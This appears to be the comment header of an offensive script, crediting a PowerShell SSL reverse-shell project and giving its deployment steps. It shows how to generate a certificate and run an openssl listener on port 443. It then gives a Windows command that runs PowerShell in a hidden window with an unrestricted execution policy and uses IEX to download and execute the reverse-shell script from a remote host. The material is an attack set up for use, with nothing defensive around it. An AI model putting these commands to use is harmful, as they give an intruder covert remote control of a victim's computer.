#Original Author: 
#GetShellSSL https://github.com/Gurpreet06/PowerShell-SSL-ReverseShell/blob/Gurpreet/GetShellSSL.ps1
#
#on listening endpoint: 
#generate cert
#openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
#run listener 
#openssl s_server -key key.pem -cert cert.pem -port 443
#
#deploy on windows endpoint: 
#powershell.exe -windowstyle hidden -ExecutionPolicy Unrestricted -nop -Command "IEX (New-Object Net.WebClient).DownloadString('https:///GetShellSSL.ps1')"
#
#
